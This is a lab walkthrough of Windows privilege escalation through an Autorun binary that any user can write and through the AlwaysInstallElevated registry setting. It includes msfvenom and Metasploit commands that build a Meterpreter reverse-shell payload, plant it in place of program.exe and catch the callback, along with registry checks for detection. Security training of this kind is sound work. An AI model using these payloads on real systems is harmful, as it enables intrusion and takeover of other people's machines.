# Escalation Path Registry

## Autorun

Autoruns refer to programs, scripts, or services that automatically execute when Windows starts or when a device (like a USB) is plugged in.

### Detection of Auto runs programs 

***Windows VM***

**Run Autoruns**:

Open *Command Prompt* and execute `Autoruns64.exe`.

```
**C:\Users\User\Desktop\Tools\Autoruns\Autoruns64.exe**
```

Navigate to the *‘Logon’ tab* to check programs that auto-start at user login.

**Identify Vulnerable Entry**:

"My Program" is set to run automatically from:

```
C:\Program Files\Autorun Program\program.exe
```

**Check File Permissions**:

Use *AccessChk* to inspect permissions:
   
```
accesschk64.exe -wvu "C:\Program Files\Autorun Program"
```

The output shows **"Everyone" has FILE_ALL_ACCESS**, meaning **any user (even non-admins) can modify** `program.exe`.

**Exploitation Possibility**:

- Since `program.exe` runs at *logon*, an attacker can *replace it with a malicious file* (e.g., a reverse shell).

- Upon restart/login, the system will execute the attacker’s payload, potentially leading to **privilege escalation**.

### Exploitations

**Kali VM**

Open command prompt and type: 

```
msfconsole
```

In Metasploit (msf > prompt) type: 

```
use multi/handler
```  

In Metasploit (msf > prompt) type:

```
set payload windows/meterpreter/reverse_tcp
```  

In Metasploit (msf > prompt) type: 

```
set lhost [Kali VM IP Address]
```

In Metasploit (msf > prompt) type: 

```
run
```

Open an additional command prompt and type: 

```
msfvenom -p windows/meterpreter/reverse_tcp lhost=[Kali VM IP Address] -f exe -o program.exe  
```

Copy the generated file, program.exe, to the Windows VM.

**Windows VM**

1. Place program.exe in `C:\Program Files\Autorun Program`  
2. To simulate the privilege escalation effect, logoff and then log back on as an administrator user.

**Kali VM**

1. Wait for a new session to open in Metasploit.  
2. To confirm that the attack succeeded, in Metasploit (msf > prompt) type: `getuid`

## AlwaysInstallElevated

The **AlwaysInstallElevated"** setting in Windows allows **MSI (Microsoft Installer) packages** to install with **SYSTEM privileges**, even when run by a low-privileged user. If misconfigured, an attacker can exploit it to **gain full control (privilege escalation)**.

### Detection 

**Windows VM**

1. Open command prompt and type: 

```
reg query HKLM\Software\Policies\Microsoft\Windows\Installer
```  

From the output, notice that `AlwaysInstallElevated` value is `1`. 

2. In command prompt type: 

```
reg query HKCU\Software\Policies\Microsoft\Windows\Installer
```  

From the output, notice that “AlwaysInstallElevated” value is 1